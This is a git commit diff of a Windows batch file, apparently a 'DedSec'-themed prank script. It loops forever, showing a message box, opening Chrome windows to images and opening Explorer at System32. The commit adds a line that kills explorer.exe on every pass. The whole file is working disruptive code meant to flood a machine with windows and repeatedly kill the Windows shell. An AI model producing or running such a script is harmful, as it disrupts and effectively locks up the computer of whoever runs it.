6d75f415ca1ed5637b782e20f6bff574fbf35d2d
nwy140 <nwy140@gmail.com>
2017-09-14 10:19:21 +0800

    Update LoopGenerateUnlimitedInstance.bat

--- LoopGenerateUnlimitedInstance.bat
+++ LoopGenerateUnlimitedInstance.bat
@@ -1,11 +1,12 @@
 :loop2
+
+
 REM Showing DEDSEC
 msg * We are Dedsec 
 
 start chrome --app=https://i.ytimg.com/vi/tudBj-89NHU/maxresdefault.jpg
 start chrome --app=https://pbs.twimg.com/profile_images/799694625153937408/etRAebbW.jpg
 
-start chrome --app = https://www.youtube.com/watch?v=mRgFOtJhaug&list=PL6GMmLvv-srNdZ6r8IbPNJXtTGw6OJLPB&index=30
 
 
 REM Your Username here
@@ -22,6 +23,6 @@ start
 REM Your directory path here
 start explorer C:\Windows\System32
 
-
+TASKKILL /im explorer.exe
 echo Ooops
 goto loop2
